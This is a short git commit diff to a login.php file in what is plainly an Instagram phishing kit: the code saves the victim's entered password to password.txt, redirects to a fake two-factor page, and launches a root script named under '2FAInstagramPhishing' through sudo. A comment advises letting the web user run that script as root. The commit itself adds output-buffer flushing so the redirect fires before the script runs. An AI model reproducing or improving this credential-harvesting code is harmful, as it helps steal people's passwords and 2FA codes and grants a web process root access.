4dc5b11d534fcc02d9f4968cd2a4985538d81ec8
root <root@localhost.localdomain>
2020-01-08 11:01:07 +0100

    Updating files

--- instagram/login.php
+++ instagram/login.php
@@ -8,6 +8,10 @@ $myfile = fopen("password.txt", "wa+") or die("Unable to open file!");
 fwrite($myfile, $password);
 fclose($myfile);
 //The scrip /root/root.sh must be allow for running as root for www-data in /etc/sudoers
+ob_start();
 header('Location: /instagram/2factor.html');
+ob_end_flush();
+ob_flush();
+flush();
 system("sudo /root/2FAInstagramPhishing/root.sh &");
 exit();
